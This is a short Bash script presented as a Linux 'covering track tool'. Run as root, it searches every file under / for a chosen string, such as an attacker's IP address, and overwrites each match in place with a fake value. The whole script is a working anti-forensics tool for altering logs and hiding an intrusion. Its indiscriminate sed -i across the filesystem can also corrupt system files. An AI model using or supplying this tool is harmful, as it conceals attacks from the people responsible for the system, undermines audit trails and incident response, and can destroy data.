#!/bin/bash

echo "  __     __ __           __ LINUX        "
echo " |  |__ |  |__| _____ __|  | _____ ____  "
echo " |  _  ||  |  ||     |  _  ||  -__|   _| "
echo " |_____||__|__||__|__|_____||_____|__|   "
echo "   A simple LINUX covering track tool    "
echo "             Written in BASH             "
echo ""

if [[ $(id -u) != "0" ]]; then
	echo "[ERR] You should run this script as root"
	exit
fi

echo "[i] Enter a word that you want to change"
echo "[i] Such as your IPv4 address or something"
echo -ne "[?] Enter a word : "  
read WORD
echo ""

if [[ -z ${WORD} ]]; then
	echo "[ERR] Word could not be empty"
	exit
fi

echo "[*] Checking all files which containing \"${WORD}\"..."
ALL_FILES=$(grep -Rn "${WORD}" / | awk -F ':' '{print $1}' | sort -V | uniq)
echo "[i] Done! total files is $(echo "${ALL_FILES}" | wc -l)"
echo ""

echo "[i] Enter a fake"
echo "[i] Such as fake IPv4 address or something"
echo -ne "[?] Enter a fake word : "  
read FAKEWORD
echo ""

if [[ -z ${FAKEWORD} ]]; then
	echo "[ERR] Fake word could not be empty"
	exit
fi

for LOGFILE in ${ALL_FILES}
do
	sed -i "s/${WORD}/${FAKEWORD}/g" ${LOGFILE}
	echo "[i] ${LOGFILE} changed!"
done
